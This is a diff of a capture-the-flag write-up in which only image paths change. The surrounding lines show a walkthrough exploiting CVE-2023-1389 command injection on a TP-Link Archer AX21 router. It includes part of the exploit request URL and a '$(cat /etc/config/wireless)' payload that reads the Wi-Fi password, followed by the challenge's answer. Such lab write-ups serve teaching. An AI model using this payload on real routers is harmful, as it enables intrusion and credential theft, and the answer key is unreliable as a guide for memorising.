@@ -27,7 +27,7 @@ The objective is to gain access to the router configuration and the password it 
 
 Device Information
 
-![Router logon screen showing Archer AX21 device information](media/image1.png)
+![Router logon screen showing Archer AX21 device information](images/dosisnetwork_versioninfo.jpg)
 
 The logon screen indicates that this is an **Archer AX21 v2.0** running firmware version **1.1.4 Build 20230219**.
 
@@ -49,7 +49,7 @@ CVE-2023-1389 -- Command Injection / Remote Code Execution
 
 Exploit Code Analysis
 
-![Exploit-db entry for CVE-2023-1389](media/image2.png)
+![Exploit-db entry for CVE-2023-1389](images/dosisnetwork_exploitdb)
 
 From exploit-db, the exploit code provides insight into the request structure needed:
 
@@ -114,7 +114,7 @@ url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=count
 # Send the URL twice to run the command. Sending twice is necessary for the attack
 ```
 
-![Testing GET request structure showing 200 OK response](media/image3.png)
+![Testing GET request structure showing 200 OK response](images/dosisnetwork_200.jpg)
 
 Work with the structure of the GET request until you get a **200 OK** response, indicating that the structure is valid.
 
@@ -128,7 +128,7 @@ The simplest payload is to print the file:
 $(cat%20/etc/config/wireless)
 ```
 
-![Payload execution showing wireless configuration file contents](media/image4.png)
+![Payload execution showing wireless configuration file contents](images/dosisnetwork_solution)
 
 **Answer: SprinklesAndPackets2025!**
 
